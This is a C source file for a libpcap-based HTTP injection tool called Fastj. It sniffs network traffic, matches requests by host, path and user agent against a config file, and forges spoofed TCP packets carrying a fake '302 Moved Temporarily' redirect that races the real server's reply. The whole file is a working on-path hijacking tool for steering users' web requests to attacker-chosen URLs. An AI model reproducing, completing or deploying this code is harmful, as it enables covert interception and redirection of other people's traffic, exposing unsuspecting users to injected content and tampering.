#define _GNU_SOURCE
#define APP_NAME        "Fastj"
#define APP_DESC        "Http inject using libpcap"
#define APP_COPYRIGHT    "Copyright (c) 2018"
#define APP_DISCLAIMER    "Write By XiaodongPan."

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <time.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#include "picohttpparser.h"
#include "hash.h"
#include "slog.h"

#define BILLION 1000000000L

/*the number of a batch report */
#define REPORT_BATCH_NUM 100000

/* default snap length (maximum bytes per packet to capture) */
#define MAX_PACKET_LEN 1518

/* read from uri need buffer line */
#define INPUT_BUF_LEN 1024

/* max url length, longer than 480 will be skiped */
#define MAX_URL_LEN 480

/* max host length */
#define MAX_HOST_LEN 32

/* host search len */
#define MAX_HOST_SEARCH_LEN 40

/* url buffer length, should > MAX_URL_LEN+30 */
#define URL_BUF_LEN 512

/* JS search Length */
#define SEARCH_JS_LEN 128





/*
 * payload buffer length, limit to 512, so url in url.ini will
 * be less than 512-50(the length of other in the 302 header)
 * length(url_302)<400 is a good choise
 * */
#define PAYLOAD_BUF_LEN 512

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN    6

#define max(a, b) (((a) > (b)) ? (a) : (b))
#define min(a, b) (((a) < (b)) ? (a) : (b))


hashtable_t *g_dict;
char g_config[] = "/root/fastj/conf/online.ini";


uint8_t g_local_mac[] = {0xF8, 0xBC, 0x12, 0x38, 0xA7, 0xBC};
uint8_t g_gateway_mac[] = {0x4c, 0xb1, 0x6c, 0x8b, 0x8f, 0x39};

typedef struct http_header {
    char host[MAX_HOST_LEN];
    char path[MAX_URL_LEN];
    int platform;
} http_header_t;


/* Ethernet header */
struct sniff_ethernet {
    u_char ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
    u_char ether_shost[ETHER_ADDR_LEN];    /* source host address */
    u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
    u_char ip_vhl;                 /* version << 4 | header length >> 2 */
    u_char ip_tos;                 /* type of service */
    u_short ip_len;                 /* total length */
    u_short ip_id;                  /* identification */
    u_short ip_off;                 /* fragment offset field */
#define IP_RF 0x8000            /* reserved fragment flag */
#define IP_DF 0x4000            /* dont fragment flag */
#define IP_MF 0x2000            /* more fragments flag */
#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
    u_char ip_ttl;                 /* time to live */
    u_char ip_p;                   /* protocol */
    u_short ip_sum;                 /* checksum */
    struct in_addr ip_src, ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)
#define IP_ADDR_LEN 4

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
    u_short th_sport;               /* source port */
    u_short th_dport;               /* destination port */
    tcp_seq th_seq;                 /* sequence number */
    tcp_seq th_ack;                 /* acknowledgement number */
    u_char th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
    u_char th_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short th_win;                 /* window */
    u_short th_sum;                 /* checksum */
    u_short th_urp;                 /* urgent pointer */
};


char *get_relocation_url(hashtable_t *dict, http_header_t *header, char *url);

int find_platform(const char *agent, size_t len);
//int find_platform(char *agent, size_t len);

int get_http_header(const char *header, size_t header_len, http_header_t *http_header);

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void print_payload(const u_char *payload, int len);

void print_hex_ascii_line(const u_char *payload, int len, int offset);

void print_app_banner(void);

void print_app_usage(void);

void swap_bytes(void *a, void *b, size_t width);

int build_packet(u_char *packet, char *relocation_url);

void read_config(hashtable_t *hash, char *config);

uint16_t ip_chksum(uint16_t initcksum, uint8_t *ptr, int len);

uint16_t tcp_chksum(uint16_t initcksum, uint8_t *tcphead, int tcplen, uint32_t *srcaddr, uint32_t *destaddr);

char *trim(char *str);

int str2mac(const char *macaddr, unsigned char mac[6]);


int str2mac(const char *macaddr, unsigned char mac[6]) {
    unsigned int m[6];
    if (sscanf(macaddr, "%02x:%02x:%02x:%02x:%02x:%02x",
               &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) != 6) {
        printf("Failed to parse mac address '%s'", macaddr);
        return -1;
    } else {
        mac[0] = m[0];
        mac[1] = m[1];
        mac[2] = m[2];
        mac[3] = m[3];
        mac[4] = m[4];
        mac[5] = m[5];
        return 0;
    }
}


uint16_t ip_chksum(uint16_t initcksum, uint8_t *ptr, int len) {
    unsigned int cksum;
    int idx;
    int odd;

    cksum = (unsigned int) initcksum;

    odd = len & 1;
    len -= odd;

    for (idx = 0; idx < len; idx += 2) {
        cksum += ((unsigned long) ptr[idx] << 8) + ((unsigned long) ptr[idx + 1]);
    }

    if (odd) {      /* buffer is odd length */
        cksum += ((unsigned long) ptr[idx] << 8);
    }

    /*
     * Fold in the carries
     */

    while (cksum >> 16) {
        cksum = (cksum & 0xFFFF) + (cksum >> 16);
    }

    return cksum;
}

uint16_t tcp_chksum(uint16_t initcksum, uint8_t *tcphead, int tcplen, uint32_t *srcaddr, uint32_t *destaddr) {
    uint8_t pseudoheader[12];
    uint16_t calccksum;

    memcpy(&pseudoheader[0], srcaddr, IP_ADDR_LEN);
    memcpy(&pseudoheader[4], destaddr, IP_ADDR_LEN);
    pseudoheader[8] = 0;
    pseudoheader[9] = IPPROTO_TCP;
    pseudoheader[10] = (tcplen >> 8) & 0xFF;
    pseudoheader[11] = (tcplen & 0xFF);

    calccksum = ip_chksum(0, pseudoheader, sizeof(pseudoheader));
    calccksum = ip_chksum(calccksum, tcphead, tcplen);
    calccksum = ~calccksum;
    return calccksum;
}


char *trim(char *str) {
    char *p = str;
    char *p1;
    if (p) {
        p1 = p + strlen(str) - 1;
        while (*p && isspace(*p)) p++;
        while (p1 > p && isspace(*p1)) *p1-- = '\0';
    }
    return p;
}

void read_config(hashtable_t *hash, char *config) {
    char *domain, *path, *redirect;
    int chance, platform, match;
    char *search = "|";
    char line[INPUT_BUF_LEN];
    int count = 0;

    slog_info(2, "start to load %s ...", config);
    FILE *file = fopen(config, "r");
    if (file != NULL) {
        while (fgets(line, sizeof line, file) != NULL) {
            chance = atoi(strtok(line, search));
            match = atoi(strtok(NULL, search));
            platform = atoi(strtok(NULL, search));
            domain = strtok(NULL, search);
            path = strtok(NULL, search);
            redirect = strtok(NULL, search);
            redirect = trim(redirect);
            //printf("%s %s --> %s", domain, path, redirect);
            elem_t *elem = (elem_t *) malloc(sizeof(elem_t));
            elem->chance = chance;
            elem->match = match;
            elem->platform = platform;
            strcpy(elem->domain, domain);
            strcpy(elem->path, path);
            strcpy(elem->redirect, redirect);
            elem->next = NULL;

            ht_set(hash, domain, elem);
            count++;
        }
        fclose(file);
        slog_info(2, "load %s finished, total item: %d", config, count);
    } else {
        slog_error(1, "file %s not exist!", config);
    }
}

/* platform: 0: all,  1, android, 2, ios, 3, mobile, 4, pc */
int find_platform(const char *agent, size_t len) {
    if (memmem(agent,len, "iPhone", 6) != NULL) {
        return 1;
    }

    if (memmem(agent, len, "Android", 7) != NULL ) {
        return 2;
    }

    return 4;
}

/* platform: 0: all,  1, android, 2, ios, 3, mobile, 4, pc */
/* strstr is faster than memme, and match will not at the end*/
/*int find_platform(char *agent, size_t len) {
    agent[len - 1] = '\0';
    if (strstr(agent, "iPhone") != NULL) {
        return 1;
    }

    if (strstr(agent, "Android") != NULL) {
        return 2;
    }

    return 4;
}*/

char *get_relocation_url(hashtable_t *dict, http_header_t *header, char *url) {
    elem_t *elem = NULL;
    elem = ht_get(dict, header->host);

    // domain not match, return
    if (elem == NULL) {
        return NULL;
    }

    // if have "bro=", skip
    if (strstr(header->path, "bro=") != NULL) {
        slog_debug(4, "host: %s, path: %s , has bro, skip", header->host, header->path);
        return NULL;
    }

    while (elem != NULL) {
        // reg match
        // platform: 0: all,  1, android, 2, ios, 3, mobile, 4, pc
        if (elem->match == 0) {
            if ((strstr(header->path, elem->path) != NULL) &&
                (elem->platform == 0 ||
                 elem->platform == header->platform ||
                 (elem->platform == 3 && (header->platform == 1 || header->platform == 2)))) {
                sprintf(url, "%s&domain=%s&path=%s", elem->redirect, header->host, header->path);
                return url;

            }
        } else {
            if ((strcmp(header->path, elem->path) == 0) &&
                (elem->platform == 0 ||
                 elem->platform == header->platform ||
                 (elem->platform == 3 && (header->platform == 1 || header->platform == 2)))) {
                sprintf(url, "%s&domain=%s&path=%s", elem->redirect, header->host, header->path);
                return url;
            }
        }
        elem = elem->next;
    }

    return NULL;
}


/*
 * get http header, the max url length limit to 480, 480+7+16<512
 * */
int get_http_header(const char *header, size_t header_len, http_header_t *http_header) {
    const char *method, *path;
    struct phr_header headers[16];
    size_t method_len, path_len, num_headers;
    int ret = 0, i, minor_version;
    int flag = -3;

    num_headers = 16;
    ret = phr_parse_request(header, header_len, &method, &method_len, &path, &path_len,
                            &minor_version, headers, &num_headers, 0);
    if (path_len > MAX_URL_LEN) {
        slog_debug(3, "path is very long, size: %ld", path_len);
        return flag;
    }

    // copy path to header
    sprintf(http_header->path, "%.*s", (int) path_len, path);
    flag++;


    if (ret == header_len) {
        for (i = 0; i != num_headers; ++i) {
            if (headers[i].name_len == 4 && memcmp("Host", headers[i].name, 4) == 0) {
                sprintf(http_header->host, "%.*s", (int) headers[i].value_len, headers[i].value);
                flag++;
            } else if (headers[i].name_len == 10 && memcmp("User-Agent", headers[i].name, 10) == 0) {
                http_header->platform = find_platform(headers[i].value, headers[i].value_len);
                flag++;
            }

        }
    }
    return flag;
}

/*
 * app name/banner
 */
void print_app_banner(void) {

    printf("%s - %s\n", APP_NAME, APP_DESC);
    printf("%s\n", APP_COPYRIGHT);
    printf("%s\n", APP_DISCLAIMER);
    printf("\n");
}

/*
 * print help text
 */
void print_app_usage(void) {
    printf("Usage: fastj capdev senddev sendmac gatemac\n");
}

/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
 */
void print_hex_ascii_line(const u_char *payload, int len, int offset) {

    int i;
    int gap;
    const u_char *ch;

    /* offset */
    printf("%05d   ", offset);

    /* hex */
    ch = payload;
    for (i = 0; i < len; i++) {
        printf("%02x ", *ch);
        ch++;
        /* print extra space after 8th byte for visual aid */
        if (i == 7)
            printf(" ");
    }
    /* print space to handle line less than 8 bytes */
    if (len < 8)
        printf(" ");

    /* fill hex gap with spaces if not full line */
    if (len < 16) {
        gap = 16 - len;
        for (i = 0; i < gap; i++) {
            printf("   ");
        }
    }
    printf("   ");

    /* ascii (if printable) */
    ch = payload;
    for (i = 0; i < len; i++) {
        if (isprint(*ch))
            printf("%c", *ch);
        else
            printf(".");
        ch++;
    }

    printf("\n");

    return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void print_payload(const u_char *payload, int len) {

    int len_rem = len;
    int line_width = 16;            /* number of bytes per line */
    int line_len;
    int offset = 0;                    /* zero-based offset counter */
    const u_char *ch = payload;

    if (len <= 0)
        return;

    /* data fits on one line */
    if (len <= line_width) {
        print_hex_ascii_line(ch, len, offset);
        return;
    }

    /* data spans multiple lines */
    for (;;) {
        /* compute current line length */
        line_len = line_width % len_rem;
        /* print line */
        print_hex_ascii_line(ch, line_len, offset);
        /* compute total remaining */
        len_rem = len_rem - line_len;
        /* shift pointer to remaining bytes to print */
        ch = ch + line_len;
        /* add offset */
        offset = offset + line_width;
        /* check if we have line width chars or less */
        if (len_rem <= line_width) {
            /* print last line and get out */
            print_hex_ascii_line(ch, len_rem, offset);
            break;
        }
    }
}


void swap_bytes(void *a, void *b, size_t width) {
    char *v1 = (char *) a;
    char *v2 = (char *) b;
    char tmp;
    size_t i;

    for (i = 0; i < width; i++) {
        tmp = v1[i];
        v1[i] = v2[i];
        v2[i] = tmp;
    }
}

int build_packet(u_char *packet, char *relocation_url) {
    struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
    struct sniff_ip *ip;              /* The IP header */
    struct sniff_tcp *tcp;            /* The TCP header */
    char *payload, *option;
    char payload302[PAYLOAD_BUF_LEN];
    int packet_len;
    int size_ip, size_tcp, size_option, size_payload, new_size_payload;
    u_int16_t sport, dport, sum;
    u_int32_t seq, ack;

    // memset
    //memset(payload302, 0, PAYLOAD_BUF_LEN);

    // set mac
    ethernet = (struct sniff_ethernet *) (packet);
    //swap_bytes(ethernet->ether_dhost, ethernet->ether_shost, ETHER_ADDR_LEN);
    memcpy(ethernet->ether_dhost, g_gateway_mac, ETHER_ADDR_LEN);
    memcpy(ethernet->ether_shost, g_local_mac, ETHER_ADDR_LEN);
    slog_debug(4, "%02x:%02x:%02x:%02x:%02x:%02x",
               g_local_mac[0],
               g_local_mac[1],
               g_local_mac[2],
               g_local_mac[3],
               g_local_mac[4],
               g_local_mac[5]);
    slog_debug(4, "%02x:%02x:%02x:%02x:%02x:%02x",
               g_gateway_mac[0],
               g_gateway_mac[1],
               g_gateway_mac[2],
               g_gateway_mac[3],
               g_gateway_mac[4],
               g_gateway_mac[5]);


    // set ip (src, dst, checksum)
    ip = (struct sniff_ip *) (packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;
    swap_bytes((void *) &ip->ip_src, (void *) &ip->ip_dst, 4);

    // tcp
    tcp = (struct sniff_tcp *) (packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    option = (char *) (packet + SIZE_ETHERNET + size_ip + sizeof(struct sniff_tcp));
    size_option = size_tcp - sizeof(struct sniff_tcp);
    if (size_option > 0) {
        memset(option, 0, size_option);
    }

    slog_debug(3, "option len: %d", size_option);

    sport = tcp->th_sport;
    dport = tcp->th_dport;
    tcp->th_sport = dport;
    tcp->th_dport = sport;
    tcp->th_flags = TH_PUSH | TH_ACK;


    payload = (char *) (packet + SIZE_ETHERNET + size_ip + size_tcp);
    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    seq = ntohl(tcp->th_ack);
    ack = ntohl(tcp->th_seq) + size_payload;
    tcp->th_seq = htonl(seq);
    tcp->th_ack = htonl(ack);


    // set payload
    new_size_payload = sprintf(payload302,
    //"HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
                               "HTTP/1.1 302 Moved Temporarily\r\nServer: nginx/1.0\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n\r\n\r\n",
                               relocation_url);
    new_size_payload--;

    memcpy(payload, payload302, new_size_payload);
    ip->ip_len = htons(size_ip + size_tcp + new_size_payload);
    packet_len = SIZE_ETHERNET + size_ip + size_tcp + new_size_payload;

    slog_debug(3, "payload302:%s", payload302);
    slog_debug(3, "size_payload:%d, size_eth: %d, size_ip: %d, size_tcp: %d, packet_len: %d",
               new_size_payload, SIZE_ETHERNET, size_ip, size_tcp, packet_len);

    ip->ip_sum = 0;
    sum = ip_chksum(0, (uint8_t *) ip, size_ip);
    ip->ip_sum = htons(~sum);


    tcp->th_sum = 0;
    sum = tcp_chksum(0, (uint8_t *) tcp, size_tcp + new_size_payload, &(ip->ip_src.s_addr), &(ip->ip_dst.s_addr));
    tcp->th_sum = htons(sum);

    return packet_len;
}

/*
 * dissect/print packet
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    /* declare pointers to packet headers */
    const struct sniff_ip *ip;
    const struct sniff_tcp *tcp;
    const u_char *payload;
    u_char *relocation_url;
    u_char url_buf[URL_BUF_LEN];
    u_char pkt_buf[MAX_PACKET_LEN];
    u_char host_buf[MAX_HOST_LEN];
    http_header_t req_http_header;
    size_t size_ip;
    size_t size_tcp;
    size_t size_payload;
    size_t size_packet;
    size_t size_send;


    /* qps handle */
    static int count = 0;
    static int match = 0, old_match = 0;
    static int js_match = 0, js_old_match = 0;
    static struct timespec old;
    static struct timespec new;

    if (count % REPORT_BATCH_NUM == 0) {
        clock_gettime(CLOCK_MONOTONIC, &new);
        if (count != 0) {
            float diff_nsec = (BILLION * (new.tv_sec - old.tv_sec));
            diff_nsec += new.tv_nsec - old.tv_nsec;
            float diff_sec = diff_nsec * 1e-9;
            float rate = REPORT_BATCH_NUM / diff_sec;
            float match_rate = (match - old_match) / diff_sec;
            float js_match_rate = (js_match - js_old_match) / diff_sec;
            old_match = match;
            js_old_match = js_match;
            slog_info(2, "count:%d, rate:%.3f js_rate:%.3f, match:%d, mrate:%.3f", count, rate, js_match_rate, match, match_rate);
        }
        old = new;
    }
    count++;


    ip = (struct sniff_ip *) (packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;
    if (size_ip < 20) {
        slog_debug(4, "  * Invalid IP header length: %u bytes", size_ip);
        return;
    }

    tcp = (struct sniff_tcp *) (packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    payload = (char *) (packet + SIZE_ETHERNET + size_ip + size_tcp);


    size_packet = ntohs(ip->ip_len) + SIZE_ETHERNET;
    if (size_packet > MAX_PACKET_LEN) {
        slog_debug(4, "pkt size is too long , size :%d", size_packet);
        return;
    }

    /* compute tcp payload (segment) size */
    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
    if (size_payload <= 0) {
        return;
    }


    /* fast search js and host, if not match, return */
    size_t size_search = min(SEARCH_JS_LEN, size_payload);
    if (memmem(payload, size_search, "js", 2) == NULL ) {
        return;
    } else {
	js_match++;
        u_char *p_host_buf, *p_search_tmp, *p_search_end;
        p_search_tmp = memmem(payload, size_payload, "Host:", 5);
        if (p_search_tmp == NULL) {
            return;
        }

        /* search host field, fast match */
        p_host_buf = host_buf;

        /* skip the first 5 byte (Host:)*/
        p_search_tmp += 5;
        p_search_end = payload + size_payload;
        p_search_end = min((p_search_tmp + MAX_HOST_SEARCH_LEN - 1), p_search_end);
        while (*p_search_tmp != '\r' && *p_search_tmp != '\n' && p_search_tmp < p_search_end) {
            if (isspace(*p_search_tmp)) {
                p_search_tmp++;
            } else {
                *p_host_buf++ = *p_search_tmp++;
            }
        }
        *p_host_buf = '\0';
        slog_debug(4, "host:%s\n", host_buf);
        elem_t *elem = ht_get(g_dict, host_buf);

        /* if not match host, return */
        if (elem == NULL) {
            return;
        }
    }


    /* packet send handle */
    pcap_t *handle = (pcap_t *) args;


    slog_debug(4, "   Payload (%d bytes):", size_payload);

    // get http header
    int req = get_http_header(payload, size_payload, &req_http_header);
    if (req < 0) {
        slog_debug(4, " http header parse error");
        return;
    }
    slog_debug(4, "Host: %s, Path: %s, Platform: %d", req_http_header.host,
              req_http_header.path, req_http_header.platform)


    // get relocation url
    // 1, hash domain, 2, reg search path,  3, match platform
    relocation_url = get_relocation_url(g_dict, &req_http_header, url_buf);
    //slog_debug(4, "relocation_url:%s\n", relocation_url);

    if (relocation_url == NULL) {
        return;
    }
    slog_debug(4, "relocation_url:%s", relocation_url);

    match++;
    memset(pkt_buf, MAX_PACKET_LEN, 0);
    memcpy(pkt_buf, packet, size_packet);
    size_send = build_packet(pkt_buf, relocation_url);
    if (size_send > 0) {
        int send_ret = pcap_sendpacket(handle, pkt_buf, size_send);
        if (send_ret == 0) {
            slog_debug(4, "send packat succ");
        } else {
            slog_debug(4, "send packat fail");
        }
    }

    return;
}

void usr1_list_hashtable(int dummy) {
    slog_info(2, "===== Receive USR1, List Config =======");
    ht_list(g_dict);
    slog_info(2, "=====  List Config End =======");
}

void usr2_reload_config(int dummy) {
    slog_info(2, "===== Receive USR2, Reload Config =======");
    ht_clear(g_dict);
    read_config(g_dict, g_config);
    slog_info(2, "===== Reload Config =======");
}

int main(int argc, char **argv) {
    struct sigaction sa = {.sa_flags = 0,};

    sigemptyset(&sa.sa_mask);       /* clear signal set */
    sigaddset(&sa.sa_mask, SIGUSR1);
    sigaddset(&sa.sa_mask, SIGUSR2);

    sa.sa_handler = usr1_list_hashtable;
    sigaction(SIGUSR1, &sa, NULL);
    sa.sa_handler = usr2_reload_config;
    sigaction(SIGUSR2, &sa, NULL);


    char *cap_dev = NULL;            /* capture device name */
    char *send_dev = NULL;
    char *send_mac = NULL;
    char *gate_mac = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];        /* error buffer */
    pcap_t *handle, *send_handle;                /* packet capture handle */

    char filter_exp[256];
    //char *filter_base = "tcp dst  port 80  and tcp[tcpflags] & tcp-push == tcp-push";
    char *filter_base = "tcp[tcpflags] & tcp-push == tcp-push";
    char *filter_seg;
    struct bpf_program fp;            /* compiled filter program (expression) */
    bpf_u_int32 net = 0;            /* ip */
    int num_packets = -1;            /* number of packets to capture */

    print_app_banner();

    // init log
    slog_init("fastj", NULL, 2, 3, 1);

    /* check for capture device name on command-line */
    if (argc >= 5) {
        // Usage: fastj capdev senddev sendmac gatemac
        cap_dev = argv[1];
        send_dev = argv[2];
        send_mac = argv[3];
        gate_mac = argv[4];
        if(argc==6){
            filter_seg = argv[5];
            sprintf(filter_exp, "%s and ip[15]&0x03 == %s", filter_base, filter_seg);
        }else{
            sprintf(filter_exp, "%s", filter_base);
        }
    } else {
        print_app_usage();
        exit(EXIT_FAILURE);
    }


    /* print capture info */
    slog_info(2, "cap_dev: %s, send_dev: %s, send_mac:%s , gate_mac:%s",
              cap_dev, send_dev, send_mac, gate_mac);
    slog_info(2, "Number of packets: %d", num_packets);
    slog_info(2, "Filter expression: %s", filter_exp);

    if (str2mac(send_mac, g_local_mac) < 0) {
        slog_error(1, "Paser send mac error, mac: %s", send_mac);
        exit(EXIT_FAILURE);
    }

    if (str2mac(gate_mac, g_gateway_mac) < 0) {
        slog_error(1, "Paser gateway mac error, mac: %s", gate_mac);
        exit(EXIT_FAILURE);
    }


    g_dict = ht_create(65536);
    read_config(g_dict, g_config);

    /* open capture device */
    handle = pcap_open_live(cap_dev, MAX_PACKET_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        slog_error(1, "Couldn't open device %s: %s", cap_dev, errbuf);
        exit(EXIT_FAILURE);
    }

    /* open send device */
    send_handle = pcap_open_live(send_dev, MAX_PACKET_LEN, 1, 1000, errbuf);
    if (send_handle == NULL) {
        slog_error(1, "Couldn't open device %s: %s", cap_dev, errbuf);
        exit(EXIT_FAILURE);
    }

    /* compile the filter expression */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        slog_error(1, "Couldn't parse filter %s: %s",
                   filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    /* apply the compiled filter */
    if (pcap_setfilter(handle, &fp) == -1) {
        slog_error(1, "Couldn't install filter %s: %s",
                   filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    slog_info(2, "start inject...");
    /* now we can set our callback function */
    pcap_loop(handle, num_packets, got_packet, (u_char *) send_handle);

    /* cleanup */
    pcap_freecode(&fp);
    pcap_close(handle);
    pcap_close(send_handle);

    slog_info(2, "Capture complete.");

    return 0;
}

